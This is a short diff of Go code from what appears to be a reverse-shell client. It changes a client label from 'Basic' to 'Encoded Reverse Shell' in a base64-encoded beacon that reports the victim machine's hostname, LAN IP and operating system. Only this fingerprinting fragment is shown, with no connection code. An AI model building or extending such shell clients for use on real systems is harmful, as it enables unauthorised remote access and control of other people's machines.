@@ -46,7 +46,7 @@ func GetPort() string {
 	}
 	hostname, _ := os.Hostname()
 	sendStr := b64_encode(
-		"clientType:Basic Reverse Shell," +
+		"clientType:Encoded Reverse Shell," +
 			"lanIP:" + GetOutboundIP() + "," +
 			"isEncoded:true" + "," +
 			"os:" + runtime.GOOS + "," +
